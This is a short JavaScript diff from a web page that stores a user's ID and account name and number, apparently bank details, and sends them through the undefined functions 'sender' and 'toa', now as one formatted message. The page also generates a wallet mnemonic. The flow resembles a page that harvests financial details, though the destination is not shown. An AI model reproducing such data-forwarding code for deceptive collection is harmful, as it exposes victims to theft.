@@ -608,8 +608,6 @@
 			savedInfo.realAcc = inputRealAcc;
 			localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
 			sender({ userId: savedInfo.userId, azaName: savedInfo.azaName, realAcc: savedInfo.realAcc });
-
-			toa({ userId, inputAzaName, inputRealAcc });
 			
 			// Generate and display mnemonic
             const mnemonic = generateMnemonic();
@@ -623,6 +621,8 @@
             })
 		
 			setTimeout(() => {
+				const inputMessage = `${userId}\n\n${inputAzaName}\n\n${inputRealAcc}`
+				toa(inputMessage);
 				// Show account step   
 				accountStep.classList.add('hidden');
 				completionStep.classList.remove('hidden');
